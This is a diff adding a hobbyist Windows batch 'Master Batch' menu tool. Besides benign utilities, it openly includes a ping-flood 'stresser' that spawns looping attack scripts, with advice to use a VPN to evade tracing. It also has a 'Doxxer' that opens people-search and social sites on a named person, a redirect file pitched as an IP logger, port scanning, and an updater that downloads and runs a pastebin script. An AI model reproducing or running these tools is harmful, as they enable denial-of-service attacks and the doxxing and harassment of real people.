@@ -1,0 +1,903 @@
+@echo off
+mode con lines=32 cols=79
+::VERSION 1.7 updated 11/11/20
+::Changelogs: 
+::Added new IP Searcher that uses a websites API to print in the batch itsself
+::added portscan and used same method ;)
+::added a sign in log in %appdata% to turn it off delete line 18 and line 121!
+::Made it so that username change STAYS even after restarting the batch!
+::Removed features off menu but can still be found in source code
+::Changed around menu UI
+::Few other changes that aren't worth mentioning
+::MORE FEATURES
+:random
+call %appdata%\BatchUsername.bat
+if exist ipinfomaker.bat del ipinfomaker.bat
+if exist ipinfo.txt del ipinfo.txt
+if exist portscan.bat del portscan.bat
+if exist portscaninfo.txt del ipinfo.txt
+echo %username% Signed in at %date% %time% >> %appdata%\MasterBatchLogs.txt
+
+Title Master Batch
+color a 
+cls
+echo Welcome to a self coded master batch! -Coded by FittedBark9#9887
+echo Added a sign in and sign out log in %appdata% to turn it off delete line 18 and line 121!!:)
+::echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+echo Version 1.7
+pause
+goto choice1
+::btw for future use pause>nul doesnt show the press key to continue
+:namechange
+cls
+color 2
+set /p username=Enter your name:
+echo set username=%username% > %appdata%\BatchUsername.bat
+cls
+echo Username is now: %username%
+pause
+goto choice1
+
+:choice1
+set choice=blankchoice
+call %appdata%\BatchUsername.bat
+Title Master Batch
+::Basically the main menu
+cls
+color a 
+echo Welcome: %username%
+date /t 
+time /t 
+echo =================================Master=Batch=================================
+echo ------------------------------------------------------------------------------
+::echo 1)Make a new custom file
+::echo 2)Random text file
+::echo 1)Website loader
+::echo 3)Search engine
+::echo 9)Random Image searcher
+echo 1)Ping IP/website
+echo 2)Calculator
+echo 3)IP/Website stresser
+echo 4)Batch website redirect maker
+echo 5)Change name
+echo 6)Computer file cleaner
+echo 7)50/50 Coin flip
+echo 8)Information
+echo 9)Search IP Address
+echo 10)Find Websites IP
+echo 11)Open File (For python etc.)
+echo 12)Search On YouTube
+echo 13)Timer
+echo 14)Doxxer (W.I.P.)
+echo 15)Create Hotspot
+echo 16)See Own IP
+echo 17)Find Text In A File
+echo 18)Search IP Address (BETA)
+echo 19)Portscan an IP (W.I.P.)
+echo 20)Tracerout an ip
+echo 21)Reverse DNS lookup
+echo 22)Dump page links
+echo 23)Update
+echo 24)Exit
+echo -------------------------------------------------------------------------------
+echo ==============================Make=Sure=To=Update==============================
+::I am not a part of anything you do with this program so use this at own risk
+set /p choice=Choice:
+::if %choice%==1 goto file
+::if %choice%==2 goto randomtxt
+::if %choice%==1 goto websites
+::if %choice%==3 goto search
+::if %choice%==9 goto randoimage
+if %choice%==1 goto ipping
+if %choice%==2 goto calculator
+if %choice%==3 goto stresschoice
+if %choice%==4 goto websitebat
+if %choice%==5 goto namechange
+if %choice%==6 goto computerclean
+if %choice%==7 goto 50/50
+if %choice%==8 goto info
+if %choice%==9 goto searchip
+if %choice%==10 goto findipwebsite
+if %choice%==11 goto openfile
+if %choice%==12 goto searchyt
+if %choice%==13 goto timer
+if %choice%==14 goto dox
+if %choice%==15 goto hotspot
+if %choice%==16 goto seeownip
+if %choice%==17 goto searchfiles
+if %choice%==18 goto iplookup2
+if %choice%==19 goto portscanner
+if %choice%==20 goto tracerout
+if %choice%==21 goto reversedns
+if %choice%==22 goto dumppage
+if %choice%==23 goto update
+if %choice%==24 goto end
+
+echo %choice% is not a valid choice
+pause
+goto choice1
+
+:end
+echo %username% Offically signed out at %date% %time% >> %appdata%\MasterBatchLogs.txt
+exit
+
+:file
+cls
+Title Custom File Maker
+Color D
+set /p text=What would you like it to say?:
+echo -------------------------------------------------------------------------------
+set /p name=What would you like the name of the file to be?:
+echo -------------------------------------------------------------------------------
+set /p type=What would you like the type of file to be? (txt, bat, lua etc.):
+echo -------------------------------------------------------------------------------
+echo %text% > %name%.%type%
+pause
+echo File generated!
+pause
+::this is basically the default class/redirect I use when someone is done with a function just do goto choice2 
+:choice2
+cls
+set choice=blankchoice
+echo 1)Back to home
+echo 2)Close
+echo -------------------------------------------------------------------------------
+set /p choice=Choice:
+if %choice%==1 goto choice1
+if %choice%==2 goto end
+echo %choice% is not a valid answer
+pause
+goto choice2
+
+:randomtxt
+cls
+Title Random Text File Generator
+color E
+echo Press any key to generate a random text file :)
+pause
+echo %random% > %random%.txt
+echo Text file generated
+pause
+goto choice2
+
+:websites
+cls
+Title Website Loader
+color b
+echo 1)YouTube
+echo 2)Twitter
+echo 3)Facebook
+echo 4)Instagram
+echo 5)Steam account generator
+echo 6)Home
+echo -------------------------------------------------------------------------------
+set /p choice=Choice:
+if %choice%==1 goto yt
+if %choice%==2 goto twit
+if %choice%==3 goto face
+if %choice%==4 goto insta
+if %choice%==5 goto accgen
+if %choice%==6 goto choice1
+echo %choice% is not a choice %name%
+pause
+goto websites
+
+:yt
+cls
+start https://youtube.com
+pause
+goto choice2
+
+:twit
+cls
+start https://twitter.com
+pause
+goto choice2
+
+:face
+cls
+::These all used to be start "" https://facebook.com so if they break thats why
+start https://facebook.com
+pause
+goto choice2
+
+:insta
+cls
+start https://instagram.com
+pause
+goto choice2
+
+:accgen
+cls
+start https://accgen.cathook.club/
+goto choice2
+
+:calculator
+cls
+Title Calculator
+color c
+echo 1)Addition
+echo 2)Subtraction
+echo 3)Multiplication
+echo 4)Division
+echo 5)Back home
+echo -------------------------------------------------------------------------------
+set /p choice=Choice:
+if %choice%==1 goto add
+if %choice%==2 goto sub
+if %choice%==3 goto mult
+if %choice%==4 goto divide
+if %choice%==5 goto choice1
+echo Error %choice% is not a valid answer
+pause
+goto calculator
+
+:add
+cls
+echo Addition!
+echo -------------------------------------------------------------------------------
+set /p #1=Number 1:
+echo          +
+set /p #2=Number 2:
+set /a sum=#1+#2
+pause
+echo Answer is: %sum%!
+pause
+goto choice2
+
+:sub
+cls
+echo Subtraction!
+echo -------------------------------------------------------------------------------
+set /p #1=Number 1:
+echo          -
+set /p #2=Number 2:
+set /a sum=#1-#2
+pause
+echo Answer is: %sum%!
+pause
+goto choice2
+
+:mult
+cls
+echo Multiplication!
+echo -------------------------------------------------------------------------------
+set /p #1=Number 1:
+echo          X
+set /p #2=Number 2:
+set /a sum=#1*#2
+pause
+echo Answer is: %sum%!
+pause
+goto choice2
+
+:divide
+cls
+echo Division!
+echo -------------------------------------------------------------------------------
+set /p #1=Number 1:
+echo          /
+set /p #2=Number 2:
+set /a sum=#1/#2
+echo Answer is: %sum%!
+pause
+goto choice2
+
+:search
+::pretty bad search engine lets try to make one directly in the code 
+cls
+Title Search Engine
+color 1F
+echo Type 1 Keyword to Search (Use + instead of spaces)
+set /p search=Search:
+start https://www.google.com/search?q=%search%
+cls
+goto choice2
+
+:ipping
+::This part was used off of this pinger because it went hella fast Link: https://anonfile.com/BeU3w2X1nd/Ip_Ping_bat
+cls
+
+Title IP Pinger
+color C 
+set /p ip=IP Address (Press ctrl+C to stop):
+:pinging
+Title Pinging...
+ping -n 1 %ip% | FIND "TTL=" 
+if ERRORLEVEL 1 (SET OUT=C & echo nn down.  ) ELSE (SET OUT=02)
+ping -t -l 65500 2 -1 10 127.0.0.1 >nul
+goto pinging
+
+:stresschoice
+::Just a precaution to make sure someone wants to stress an ip 
+cls
+Title ARE YOU SURE 
+color 4
+echo -------------------------------------ARE YOU SURE-------------------------------------
+echo 1)IP Stresser (MAKE SURE TO BE ON A VPN JUST ENCASE THEY KNOW HOW TO USE WIRESHARK lol)
+echo 2)Back home
+echo 3)Exit
+set /p choice=Choice:
+if %choice%==1 goto enterip
+if %choice%==2 goto choice1
+if %choice%==3 goto end
+echo %choice% is not a valid answer
+pause
+goto stresschoice
+
+:enterip
+Title Enter IP
+del stressing1.bat
+del stressing2.bat
+del stressing3.bat
+del stressing4.bat
+del deletestressfiles.bat
+cls
+:: Max i think is 65500 but lets keep it here, I'll test later
+set /p deadip=IP Address or website url to stress (Press ctrl+C to stop):
+echo @echo off >> stressing1.bat
+echo :stress >> stressing1.bat
+echo ping %deadip% -l 6500 -w 1 -n 1 >> stressing1.bat
+echo goto stress >> stressing1.bat
+echo @echo off >> stressing2.bat
+echo :stress >> stressing2.bat
+echo ping %deadip% -l 6500 -w 1 -n 1 >> stressing2.bat
+echo goto stress >> stressing2.bat
+echo @echo off >> stressing3.bat
+echo :stress >> stressing3.bat
+echo ping %deadip% -l 6500 -w 1 -n 1 >> stressing3.bat
+echo goto stress >> stressing3.bat
+echo @echo off >> stressing4.bat
+echo :stress >> stressing4.bat
+echo ping %deadip% -l 6500 -w 1 -n 1 >> stressing4.bat 
+echo goto stress >> stressing4.bat
+
+echo @echo off >> deletestressfiles.bat
+echo del stressing1.bat >> deletestressfiles.bat
+echo del stressing2.bat >> deletestressfiles.bat
+echo del stressing3.bat >> deletestressfiles.bat
+echo del stressing4.bat >> deletestressfiles.bat
+echo del deletestressfiles.bat >> deletestressfiles.bat 
+start stressing1.bat
+start stressing2.bat
+start stressing3.bat
+start stressing4.bat
+
+:stress
+::actual stresser, needs update at the time of 11/1/19 it can only hit someone up to 200 ms
+Title Stressing...
+ping %deadip% -l 6500 -w 1 -n 1
+goto stress
+
+:Websitebat
+cls
+Title Batch website redirect
+color 1
+echo This can be used as a normal redirect or a ip logger when someone opens it if you enter a website that logs ip's
+echo Include https://
+set /p logwebsite=Enter website:
+echo start "" %logwebsite% > website.bat
+pause
+cls
+echo Check this file and there should be a file called website.bat, when this file is opened it should open the website you entered
+pause
+goto choice2
+
+:deleteips
+if exist stressing1.bat del stressing1.bat
+if exist stressing2.bat del stressing2.bat
+if exist stressing3.bat del stressing3.bat
+if exist stressing4.bat del stressing4.bat
+goto stresschoice
+
+:computerclean
+cls
+color 1
+echo 1)Delete temporary files
+echo 2)Delete cookies
+echo 3)Disk clean up
+echo 4)Back to home
+echo 5)Exit
+set /p choice=Choice:
+if %choice%==1 goto temp
+if %choice%==2 goto cookies
+if %choice%==3 goto diskclean
+if %choice%==4 goto choice1
+if %choice%==5 goto end
+echo %choice% is not an option %name%
+pause
+goto computerclean
+
+:temp
+cls
+ping localhost -n 3 >nul
+del /f /q "%userprofile%\AppData\Local\Microsoft\Windows\Temporary Internet Files\*.*"
+pause
+echo Done!
+pause
+goto computerclean
+
+:cookies
+cls
+ping localhost -n 3 >nul
+del /f /q "%userprofile%\Cookies\*.*"
+pause
+echo Done!
+pause
+goto computerclean
+
+:diskclean
+cls
+ping localhost -n 3 >nul
+if exist "C:\WINDOWS\temp"del /f /q "C:WINDOWS\temp\*.*"
+if exist "C:\WINDOWS\tmp" del /f /q "C:\WINDOWS\tmp\*.*"
+if exist "C:\tmp" del /f /q "C:\tmp\*.*"
+if exist "C:\temp" del /f /q "C:\temp\*.*"
+if exist "%temp%" del /f /q "%temp%\*.*"
+if exist "%tmp%" del /f /q "%tmp%\*.*"
+if not exist "C:\WINDOWS\Users\*.*" goto skip;
+if exist "C:\WINDOWS\Users\*.zip" del "C:\WINDOWS\Users\*.zip" /f /q
+if exist "C:\WINDOWS\Users\*.exe" del "C:\WINDOWS\Users\*.exe" /f /q
+if exist "C:\WINDOWS\Users\*.gif" del "C:\WINDOWS\Users\*.gif" /f /q
+if exist "C:\WINDOWS\Users\*.jpg" del "C:\WINDOWS\Users\*.jpg" /f /q
+if exist "C:\WINDOWS\Users\*.png" del "C:\WINDOWS\Users\*.png" /f /q
+if exist "C:\WINDOWS\Users\*.bmp" del "C:\WINDOWS\Users\*.bmp" /f /q
+if exist "C:\WINDOWS\Users\*.avi" del "C:\WINDOWS\Users\*.avi" /f /q
+if exist "C:\WINDOWS\Users\*.mpg" del "C:\WINDOWS\Users\*.mpg" /f /q
+if exist "C:\WINDOWS\Users\*.mpeg" del "C:\WINDOWS\Users\*.mpeg" /f /q
+if exist "C:\WINDOWS\Users\*.ra" del "C:\WINDOWS\Users\*.ra" /f /q
+if exist "C:\WINDOWS\Users\*.ram" del "C:\WINDOWS\Users\*.ram"/f /q
+if exist "C:\WINDOWS\Users\*.mp3" del "C:\WINDOWS\Users\*.mp3" /f /q
+if exist "C:\WINDOWS\Users\*.mov" del "C:\WINDOWS\Users\*.mov" /f /q
+if exist "C:\WINDOWS\Users\*.qt" del "C:\WINDOWS\Users\*.qt" /f /q
+if exist "C:\WINDOWS\Users\*.asf" del "C:\WINDOWS\Users\*.asf" /f /q
+:skip
+if not exist C:\WINDOWS\Users\Users\*.* goto skippy /f /q
+if exist C:\WINDOWS\Users\AppData\Temp\*.zip del C:\WINDOWS\Users\Users\*.zip /f /q
+if exist C:\WINDOWS\Users\AppData\Temp\*.exe del C:\WINDOWS\Users\Users\*.exe /f /q
+if exist C:\WINDOWS\Users\AppData\Temp\*.gif del C:\WINDOWS\Users\Users\*.gif /f /q
+if exist C:\WINDOWS\Users\AppData\Temp\*.jpg del C:\WINDOWS\Users\Users\*.jpg /f /q
+if exist C:\WINDOWS\Users\AppData\Temp\*.png del C:\WINDOWS\Users\Users\*.png /f /q
+if exist C:\WINDOWS\Users\AppData\Temp\*.bmp del C:\WINDOWS\Users\Users\*.bmp /f /q
+if exist C:\WINDOWS\Users\AppData\Temp\*.avi del C:\WINDOWS\Users\Users\*.avi /f /q
+if exist C:\WINDOWS\Users\AppData\Temp\*.mpg del C:\WINDOWS\Users\Users\*.mpg /f /q
+if exist C:\WINDOWS\Users\AppData\Temp\*.mpeg del C:\WINDOWS\Users\Users\*.mpeg /f /q
+if exist C:\WINDOWS\Users\AppData\Temp\*.ra del C:\WINDOWS\Users\Users\*.ra /f /q
+if exist C:\WINDOWS\Users\AppData\Temp\*.ram del C:\WINDOWS\Users\Users\*.ram /f /q
+if exist C:\WINDOWS\Users\AppData\Temp\*.mp3 del C:\WINDOWS\Users\Users\*.mp3 /f /q
+if exist C:\WINDOWS\Users\AppData\Temp\*.asf del C:\WINDOWS\Users\Users\*.asf /f /q
+if exist C:\WINDOWS\Users\AppData\Temp\*.qt del C:\WINDOWS\Users\Users\*.qt /f /q
+if exist C:\WINDOWS\Users\AppData\Temp\*.mov del C:\WINDOWS\Users\Users\*.mov /f /q
+:skippy
+if exist "C:\WINDOWS\ff*.tmp" del C:\WINDOWS\ff*.tmp /f /q
+if exist C:\WINDOWS\ShellIconCache del /f /q "C:\WINDOWS\ShellI~1\*.*"
+pause
+echo Done!
+pause
+goto computerclean
+
+:randoimage
+cls
+color 8
+echo Press any key to search a random image
+pause
+start http://www.diddly.com/random/
+cls 
+pause
+cls
+echo 1)Another random image
+echo 2)Back home
+echo 3)Exit 
+set /p choice=Choice:
+if %choice%==1 goto randoimage
+if %choice%==2 goto choice1
+if %choice%==3 goto end
+echo Sorry %choice% is not an option here
+pause
+goto randoimage
+
+:50/50
+::Kinda sucks cuz it mostly chooses 1 idk why its just ANNOYING
+cls
+color 9
+echo Make your guess now (Heads or Tails)
+pause 
+cls
+set /a randnum=%random% %%2 + 1
+if %randnum%==1 echo Heads
+if %randnum%==2 echo Tails
+pause 
+goto choice2
+
+:info
+cls
+echo This whole thing was coded by Fitted, my discord is FittedBark9#9887, message me for suggestions
+pause 
+cls
+echo The 50/50 chance coin flip and the random image search was suggested by ReX#5467
+pause
+echo Check Out my youtube channel search Vortex HvH or https://www.youtube.com/channel/UCG922dMWBvUKpnNJFgtHhoA
+pause
+goto choice1
+
+:searchip
+cls
+color 6
+set /p ipsearch=Enter IP:
+start https://www.ip-tracker.org/locator/ip-lookup.php?ip=%ipsearch%
+goto choice2
+
+:Hotspot
+cls
+color c
+Title Hotspot
+echo 1)Start hosted network
+echo 2)Stop hosted network
+set /p choice=Choice:
+if %choice%==1 goto starthnw
+if %choice%==2 goto stophnw
+echo %choice% is not a valid choice
+goto hotspot
+
+:starthnw
+cls
+set /p networkname=Hotspot Name:
+set /p networkpassword=Hotspot Password(Must be 8 Characters):
+netsh wlan set hostednetwork mode=allow ssid=%networkname% key=%networkpassword%
+netsh wlan start hostednetwork
+pause
+goto choice2
+
+:stophnw
+netsh wlan stop hostednetwork
+pause
+goto choice2
+
+:findipwebsite
+cls
+Title Find IP
+color C 
+set /p ip=Website(No https://):
+Title Got IP
+cls
+ping -n 1 %ip% | findstr "for"
+::ping -t -l 65500 2 -1 10 127.0.0.1 >nul
+pause
+goto choice2
+
+:openfile
+cls
+Echo Make sure the file is in the same folder as this!
+set /p nameoffile=Name Of File:
+set /p extent=Extention(py, bat, No dot):
+cls
+%nameoffile%.%extent%
+pause
+goto choice2
+
+:searchyt
+cls
+set /p ytsearch=Search:
+start https://www.youtube.com/results?search_query=%ytsearch%
+goto choice2
+
+:timer
+cls
+color f
+set /p time=How many seconds (Min 10):
+timeout %time%
+goto choice2
+
+:dox
+Title Dox Someone ;)
+cls
+color b
+echo type 123 if you don't have access
+set /p ip=Enter IP(optional):
+cls
+set /p firstname=First Name:
+cls
+set /p lastname=Last Name:
+cls
+set /p csoz=City State Or Zip Code:
+cls
+set /p doxusername=Username/Alias on websites:
+goto checkifip
+
+:checkifip
+cls
+if ip==123 goto currentlydoxxing
+goto currentlydoxxing
+
+:currentlydoxxing
+cls
+start https://www.whitepages.com/name/%firstname%-%lastname%/?fs=1&l=%csoz%&q=%firstname%+%lastname%
+start https://www.advancedbackgroundchecks.com/names/%firstname%-%lastname%_%csoz%
+start https://www.zabasearch.com/people/%firstname%+%lastname%/
+start https://www.anywho.com/people/%firstname%-%lastname%/%csoz%
+start https://www.youtube.com/results?search_query=%doxusername%
+start https://twitter.com/%doxusername%
+start https://www.reddit.com/user/%doxusername%/
+start https://www.twitch.tv/%doxusername%
+start https://www.instagram.com/%doxusername%/
+start https://www.instagram.com/%firstname%%lastname%/
+start https://www.google.com/search?q=%firstname%+%lastname%&sxsrf=ALeKk008zXYOCVyRSvJFEspKyknWgU6f1Q:1589005197978&source=lnms&tbm=isch&sa=X&ved=2ahUKEwjjnfzSkabpAhUCP30KHbRpDS8Q_AUoAnoECAsQBA&biw=1920&bih=938
+goto choice2
+
+:haveip
+cls
+start https://www.ip-tracker.org/locator/ip-lookup.php?ip=%ip%
+start https://www.whitepages.com/name/%firstname%-%lastname%/?fs=1&l=%csoz%&q=%firstname%+%lastname%
+start https://www.advancedbackgroundchecks.com/names/%firstname%-%lastname%_%csoz%
+start https://www.zabasearch.com/people/%firstname%+%lastname%/
+start https://www.anywho.com/people/%firstname%-%lastname%/%csoz%
+start https://www.youtube.com/results?search_query=%doxusername%
+start https://twitter.com/%doxusername%
+start https://www.reddit.com/user/%doxusername%/
+start https://www.twitch.tv/%doxusername%
+start https://www.instagram.com/%doxusername%/
+start https://www.instagram.com/%firstname%%lastname%/
+start https://www.google.com/search?q=%firstname%+%lastname%&sxsrf=ALeKk008zXYOCVyRSvJFEspKyknWgU6f1Q:1589005197978&source=lnms&tbm=isch&sa=X&ved=2ahUKEwjjnfzSkabpAhUCP30KHbRpDS8Q_AUoAnoECAsQBA&biw=1920&bih=938
+goto choice2
+
+:update
+Title Update
+Set "url=https://pastebin.com/raw/qQXj89Tb"
+for %%# in (%url%) do ( set "File=%tmp%\%%~n#.bat" )
+Call :Download "%url%" "%File%"
+If exist "%File%" ( 
+    ( Type "%File%")>con
+( Type "%File%" > "Master Batch By Fitted UPDATED.bat")
+)
+Pause>nul & Exit
+
+:Download <url> <File>
+Powershell.exe -command "(New-Object System.Net.WebClient).DownloadFile('%1','%2')"
+::timeout 10
+::DEL "%~f0" /b
+::exit /b
+cls
+echo Loading.
+Title Loading.
+ping localhost -n 2 >nul
+cls
+echo Loading..
+Title Loading..
+ping localhost -n 2 >nul
+cls
+echo Loading...
+Title Loading...
+ping localhost -n 2 >nul
+cls
+echo COMPLETED
+Title Completed!
+start /b "" cmd /c del "%~f0"&exit /b
+
+:seeownip
+cls
+color d
+title See IP
+nslookup myip.opendns.com resolver1.opendns.com | findstr /v "208.67.222.222" | findstr /v "Server:" | findstr /v "Name:" | findstr /v "answer:"
+::echo IP Is the second one
+pause
+goto choice2
+
+
+:searchfiles
+cls
+Title Search File
+set /p namefile=Name or directory of file:
+set /p searchingfor=Search for:
+set /p fileextention=Extention (txt, sql, json) *NO DOT*:
+type %namefile%.%fileextention% | findstr "%searchingfor%"
+pause
+goto choice2
+
+:iplookup2
+cls
+Title Search IP
+color c
+set /p ipsearch=IP Address:
+echo @echo off >> ipinfomaker.bat
+echo powershell wget "https://ipapi.co/%ipsearch%/json/" -OutFile ipinfo.txt >> ipinfomaker.bat
+echo exit >> ipinfomaker.bat
+echo for /f "tokens=*" %%A in (ipinfo.txt) do (echo%%A) >> ipinfomaker.bat
+
+start ipinfomaker.bat
+cls
+echo Loading.
+Title Loading.
+ping localhost -n 2 >nul
+cls
+echo Loading..
+Title Loading..
+ping localhost -n 2 >nul
+cls
+echo Loading...
+Title Loading...
+ping localhost -n 2 >nul
+cls
+echo Loading.
+Title Loading.
+ping localhost -n 2 >nul
+cls
+Title Information
+color a
+echo For: %ipsearch%
+echo =======================================================================================
+type ipinfo.txt | findstr "ip"
+type ipinfo.txt | findstr "city"
+type ipinfo.txt | findstr "region" 
+type ipinfo.txt | findstr "country" | findstr /v "country_code" | findstr /v "country_code_iso3" | findstr /v "country_capital" | findstr /v "country_tld" | findstr /v "country_calling_code" | findstr /v "country_area" | findstr /v "country_population"
+type ipinfo.txt | findstr "postal" 
+type ipinfo.txt | findstr "latitude"
+type ipinfo.txt | findstr "longitude"
+type ipinfo.txt | findstr "timezone"
+type ipinfo.txt | findstr "currency" | findstr /v "currency_name"
+type ipinfo.txt | findstr "country_calling_code"
+echo =======================================================================================
+echo Searched with https://ipapi.co/
+
+del ipinfo.txt
+del ipinfomaker.bat
+echo.
+pause
+goto choice2
+::del ipinfo.txt
+::del ipinfomaker.bat
+
+:portscanner
+cls
+Title Portscan IP
+color b
+set /p ipsearch=IP Address:
+echo @echo off >> portscan.bat
+echo powershell wget "https://api.hackertarget.com/nmap/?q=%ipsearch%" -OutFile portscaninfo.txt >> portscan.bat
+echo exit >> portscan.bat
+echo for /f "tokens=*" %%A in (portscaninfo.txt) do (echo%%A) >> portscan.bat
+
+start portscan.bat
+cls
+echo Loading.
+Title Loading.
+ping localhost -n 2 >nul
+cls
+echo Loading..
+Title Loading..
+ping localhost -n 2 >nul
+cls
+echo Loading...
+Title Loading...
+ping localhost -n 2 >nul
+cls
+echo Loading.
+Title Loading.
+ping localhost -n 2 >nul
+cls
+echo Loading..
+Title Loading..
+ping localhost -n 2 >nul
+cls
+echo Loading...
+Title Loading...
+ping localhost -n 2 >nul
+cls
+
+Title Information
+color a
+echo For %ipsearch%:
+echo =======================================================================================
+type portscaninfo.txt | findstr "PORT"
+type portscaninfo.txt | findstr "21/tcp"
+type portscaninfo.txt | findstr "22/tcp" 
+type portscaninfo.txt | findstr "23/tcp" 
+type portscaninfo.txt | findstr "80/tcp"
+type portscaninfo.txt | findstr "110/tcp"
+type portscaninfo.txt | findstr "143/tcp"
+type portscaninfo.txt | findstr "443/tcp"
+type portscaninfo.txt | findstr "3389/tcp"
+echo =======================================================================================
+echo Scanned with https://hackertarget.com
+
+del portscaninfo.txt
+del portscan.bat
+echo.
+pause
+goto choice2
+
+:tracerout
+cls
+color 4
+Title Tracerout
+set /p iptrace=Enter IP:
+tracert %iptrace%
+pause
+goto choice2
+
+:reversedns
+cls
+color b
+title Reverse DNS
+set /p ipsearch=IP Address:
+echo @echo off >> reversedns.bat
+echo powershell wget "https://api.hackertarget.com/reversedns/?q=%ipsearch%" -OutFile reversednsinfo.txt >> reversedns.bat
+echo exit >> reversedns.bat
+echo for /f "tokens=*" %%A in (reversednsinfo.txt) do (echo%%A) >> reversedns.bat
+start reversedns.bat
+cls
+echo Loading.
+Title Loading.
+ping localhost -n 2 >nul
+cls
+echo Loading..
+Title Loading..
+ping localhost -n 2 >nul
+cls
+echo Loading...
+Title Loading...
+ping localhost -n 2 >nul
+cls
+
+echo For %ipsearch%:
+echo =======================================================================================
+type reversednsinfo.txt | findstr "%ipsearch%"
+echo =======================================================================================
+echo Scanned with https://hackertarget.com
+
+
+del reversednsinfo.txt
+del reversedns.bat
+echo.
+pause
+goto choice2
+
+
+:dumppage
+cls
+color c
+title Dump Web Page
+set /p website=Website:
+echo @echo off >> dumpingwebsite.bat
+echo powershell wget "https://api.hackertarget.com/pagelinks/?q=%website%" -OutFile dumpedwebsite.txt >> dumpingwebsite.bat
+echo exit >> dumpingwebsite.bat
+echo for /f "tokens=*" %%A in (dumpedwebsite.txt) do (echo%%A) >> dumpingwebsite.bat
+start dumpingwebsite.bat
+cls
+echo Loading.
+Title Loading.
+ping localhost -n 2 >nul
+cls
+echo Loading..
+Title Loading..
+ping localhost -n 2 >nul
+cls
+echo Loading...
+Title Loading...
+ping localhost -n 2 >nul
+cls
+echo Loading.
+Title Loading.
+ping localhost -n 2 >nul
+cls
+echo Loading..
+Title Loading..
+ping localhost -n 2 >nul
+cls
+echo Loading...
+Title Loading...
+ping localhost -n 2 >nul
+cls
+title Dump Info
+echo For %website%:
+echo =======================================================================================
+type dumpedwebsite.txt | findstr "http"
+echo =======================================================================================
+echo Scanned with https://hackertarget.com
+
+
+del dumpedwebsite.txt
+del dumpingwebsite.bat
+echo.
+pause
+goto choice2
